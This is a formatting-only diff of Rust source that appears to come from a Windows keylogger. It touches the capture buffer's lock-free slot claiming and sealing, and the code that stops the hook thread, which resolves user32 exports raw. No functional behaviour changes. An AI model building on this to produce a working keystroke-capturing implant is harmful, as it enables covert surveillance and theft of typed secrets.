@@ -694,7 +694,7 @@ fn claim_buf_index() -> Option<usize> {
             return None; // full — drop newest (documented behavior).
         }
         match BUF_LEN.compare_exchange(len, len + 1, Ordering::AcqRel, Ordering::Acquire) {
-            Ok(_) => return Some(len), // uniquely claimed `len`.
+            Ok(_) => return Some(len),   // uniquely claimed `len`.
             Err(actual) => len = actual, // another writer moved the head; retry.
         }
     }
@@ -1207,8 +1207,7 @@ fn stop_hook_thread() {
 /// PostThreadMessageW is a user32 export — resolve it raw to keep symmetry
 /// with the hook thread's resolution).
 fn stop_hook_thread_post_quit(tid: u32) {
-    if let Some(addr) =
-        unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW") }
+    if let Some(addr) = unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW") }
     {
         let f: PostThreadMessageWFn = unsafe { core::mem::transmute(addr) };
         // SAFETY: tid is a real Win32 TID; WM_QUIT takes no payload.
@@ -1314,13 +1313,8 @@ fn do_keylog_seal_and_quiesce() -> usize {
     let mut head = BUF_LEN.load(Ordering::Acquire);
     if head != 0 {
         loop {
-            match BUF_LEN.compare_exchange(
-                head,
-                BUF_CAP,
-                Ordering::AcqRel,
-                Ordering::Acquire,
-            ) {
-                Ok(_) => break, // sealed at `head`.
+            match BUF_LEN.compare_exchange(head, BUF_CAP, Ordering::AcqRel, Ordering::Acquire) {
+                Ok(_) => break,               // sealed at `head`.
                 Err(actual) => head = actual, // a writer claimed past us; re-seal.
             }
         }
